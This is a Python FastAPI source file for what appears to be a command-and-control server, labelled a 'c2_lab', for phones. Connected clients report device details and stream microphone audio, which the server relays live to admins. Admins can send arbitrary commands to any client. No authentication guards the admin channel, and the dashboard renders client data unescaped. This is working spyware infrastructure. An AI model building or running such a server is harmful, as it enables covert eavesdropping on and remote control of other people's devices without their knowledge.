import asyncio
import json
import os
import sqlite3
from datetime import datetime, timedelta

import httpx
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import uvicorn

app = FastAPI()

DB = "c2_lab.db"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
PING_INTERVAL = 14 * 60


def init_db():
    con = sqlite3.connect(DB)
    cur = con.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            ip TEXT,
            last_seen TEXT,
            status TEXT,
            model TEXT,
            battery INTEGER,
            temp REAL,
            net TEXT
        )
    """)
    con.commit()
    con.close()


init_db()


class Manager:
    def __init__(self):
        self.clients = {}
        self.admins = set()

    async def connect_client(self, client_id, ws, ip):
        self.clients[client_id] = ws
        self.update_client(client_id, ip, status="online")
        self.cleanup_old_clients(ip, client_id)

    def cleanup_old_clients(self, ip, keep_id):
        """Удаляет все записи с тем же IP, кроме текущего."""
        try:
            con = sqlite3.connect(DB)
            cur = con.cursor()
            cur.execute("DELETE FROM clients WHERE ip=? AND id!=?", (ip, keep_id))
            con.commit()
            con.close()
        except Exception as e:
            print(f"cleanup_old_clients error: {e}")

    def cleanup_dead_clients(self):
        """Удаляет записи, которые offline больше 1 дня."""
        try:
            cutoff = (datetime.now() - timedelta(days=1)).isoformat()
            con = sqlite3.connect(DB)
            cur = con.cursor()
            cur.execute("DELETE FROM clients WHERE status='offline' AND last_seen < ?", (cutoff,))
            deleted = cur.rowcount
            con.commit()
            con.close()
            if deleted > 0:
                print(f"cleanup_dead_clients: удалено {deleted} старых записей")
        except Exception as e:
            print(f"cleanup_dead_clients error: {e}")

    async def connect_admin(self, ws):
        self.admins.add(ws)

    def disconnect_client(self, client_id):
        self.clients.pop(client_id, None)
        self.update_client(client_id, status="offline")

    def disconnect_admin(self, ws):
        self.admins.discard(ws)

    def update_client(self, client_id, ip=None, status=None, extra=None):
        con = sqlite3.connect(DB)
        cur = con.cursor()
        cur.execute("SELECT id FROM clients WHERE id=?", (client_id,))
        exists = cur.fetchone() is not None
        e = extra or {}
        if not exists:
            cur.execute(
                "INSERT INTO clients (id, ip, last_seen, status, model, battery, temp, net) "
                "VALUES (?,?,?,?,?,?,?,?)",
                (client_id, ip, datetime.now().isoformat(), status or "unknown",
                 e.get("model", ""), e.get("battery", 0),
                 e.get("temp", 0), e.get("net", "")))
        else:
            if extra:
                cur.execute(
                    "UPDATE clients SET ip=COALESCE(?,ip), last_seen=?, status=?, "
                    "model=?, battery=?, temp=?, net=? WHERE id=?",
                    (ip, datetime.now().isoformat(), status or "online",
                     e.get("model", ""), e.get("battery", 0),
                     e.get("temp", 0), e.get("net", ""), client_id))
            elif ip:
                cur.execute(
                    "UPDATE clients SET ip=?, last_seen=?, status=? WHERE id=?",
                    (ip, datetime.now().isoformat(), status or "online", client_id))
            else:
                cur.execute(
                    "UPDATE clients SET last_seen=?, status=? WHERE id=?",
                    (datetime.now().isoformat(), status or "online", client_id))
        con.commit()
        con.close()

    async def broadcast_to_admins(self, message: dict):
        dead = []
        for ws in list(self.admins):
            try:
                await ws.send_text(json.dumps(message))
            except Exception:
                dead.append(ws)
        for ws in dead:
            self.admins.discard(ws)

    async def send_to_client(self, client_id, message: dict):
        ws = self.clients.get(client_id)
        if ws:
            await ws.send_text(json.dumps(message))
            return True
        return False

    def list_clients(self):
        """Возвращает список клиентов с РЕАЛЬНЫМ статусом."""
        con = sqlite3.connect(DB)
        cur = con.cursor()
        cur.execute("SELECT id, ip, last_seen, status, model, battery, temp, net FROM clients")
        rows = cur.fetchall()
        con.close()
        result = []
        for row in rows:
            client_id = row[0]
            # Если сокет открыт — online, иначе offline (не важно что в базе)
            real_status = "online" if client_id in self.clients else "offline"
            result.append((row[0], row[1], row[2], real_status,
                           row[4], row[5], row[6], row[7]))
        return result


manager = Manager()


async def self_ping():
    if not RENDER_URL:
        print("RENDER_EXTERNAL_URL не задан — self-ping отключён")
        return
    ping_url = RENDER_URL.rstrip("/") + "/health"
    print(f"Self-ping запущен: {ping_url} каждые {PING_INTERVAL} сек")
    async with httpx.AsyncClient() as client:
        while True:
            try:
                await asyncio.sleep(PING_INTERVAL)
                r = await client.get(ping_url, timeout=10)
                print(f"Self-ping OK: {r.status_code}")
            except Exception as e:
                print(f"Self-ping err: {e}")


@app.on_event("startup")
async def startup_event():
    asyncio.create_task(self_ping())
    manager.cleanup_dead_clients()


@app.get("/health")
async def health():
    return {"ok": True, "time": int(datetime.now().timestamp() * 1000)}


@app.websocket("/ws/client/{client_id}")
async def client_ws(ws: WebSocket, client_id: str):
    await ws.accept()
    ip = ws.client.host if ws.client else "unknown"
    await manager.connect_client(client_id, ws, ip)
    await manager.broadcast_to_admins({
        "type": "client_connected", "client_id": client_id, "ip": ip,
    })
    try:
        while True:
            text = await ws.receive_text()
            try:
                msg = json.loads(text)
            except Exception:
                msg = {"raw": text}

            if msg.get("type") == "hello":
                manager.update_client(
                    client_id, ip=ip, status="online",
                    extra={
                        "model": msg.get("model", ""),
                        "battery": msg.get("battery", 0),
                        "temp": msg.get("temp", 0),
                        "net": msg.get("net", ""),
                    })
                await manager.broadcast_to_admins({
                    "type": "client_updated",
                    "client_id": client_id,
                    "info": msg,
                })

            # Аудио микрофона — ретрансляция админам
            if msg.get("type") == "mic_audio":
                await manager.broadcast_to_admins({
                    "type": "mic_stream",
                    "client_id": client_id,
                    "data": msg.get("data", ""),
                })
                continue

            msg["client_id"] = client_id
            msg["ts"] = datetime.now().isoformat()
            await manager.broadcast_to_admins({
                "type": "client_message", "payload": msg,
            })
    except WebSocketDisconnect:
        manager.disconnect_client(client_id)
        await manager.broadcast_to_admins({
            "type": "client_disconnected", "client_id": client_id,
        })


@app.websocket("/ws/admin")
async def admin_ws(ws: WebSocket):
    await ws.accept()
    await manager.connect_admin(ws)
    manager.cleanup_dead_clients()
    await ws.send_text(json.dumps({
        "type": "clients_list", "clients": manager.list_clients(),
    }))
    try:
        while True:
            text = await ws.receive_text()
            try:
                msg = json.loads(text)
            except Exception:
                continue

            if msg.get("type") == "get_clients":
                await ws.send_text(json.dumps({
                    "type": "clients_list",
                    "clients": manager.list_clients(),
                }))
                continue

            if msg.get("type") == "command":
                client_id = msg.get("client_id")
                command = msg.get("command")
                arg = msg.get("arg", "")
                delivered = await manager.send_to_client(client_id, {
                    "type": "command", "command": command, "arg": arg,
                })
                await ws.send_text(json.dumps({
                    "type": "command_result",
                    "client_id": client_id,
                    "command": command,
                    "arg": arg[:100],
                    "delivered": delivered,
                }))
    except WebSocketDisconnect:
        manager.disconnect_admin(ws)


@app.get("/", response_class=HTMLResponse)
async def index():
    return """<!DOCTYPE html><html><head><meta charset="utf-8"><title>saim Server</title>
<style>body{background:#2A2A2A;color:#fff;font-family:monospace;padding:20px}
table{border-collapse:collapse;width:100%}td,th{border:1px solid #555;padding:8px}</style>
</head><body><h1>saim Server — ONLINE</h1>
<table id="c"><tr><th>ID</th><th>IP</th><th>Last</th><th>Status</th><th>Model</th><th>Bat</th><th>Temp</th><th>Net</th></tr></table>
<script>
const ws=new WebSocket("wss://"+location.host+"/ws/admin");
const t=document.getElementById("c");
ws.onmessage=(e)=>{const m=JSON.parse(e.data);
if(m.type==="clients_list"){t.innerHTML="<tr><th>ID</th><th>IP</th><th>Last</th><th>Status</th><th>Model</th><th>Bat</th><th>Temp</th><th>Net</th></tr>";
for(const c of m.clients){const tr=document.createElement("tr");
tr.innerHTML=`<td>${c[0]}</td><td>${c[1]||""}</td><td>${c[2]||""}</td><td>${c[3]||""}</td><td>${c[4]||""}</td><td>${c[5]||""}</td><td>${c[6]||""}</td><td>${c[7]||""}</td>`;
t.appendChild(tr);}}};
</script></body></html>"""


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
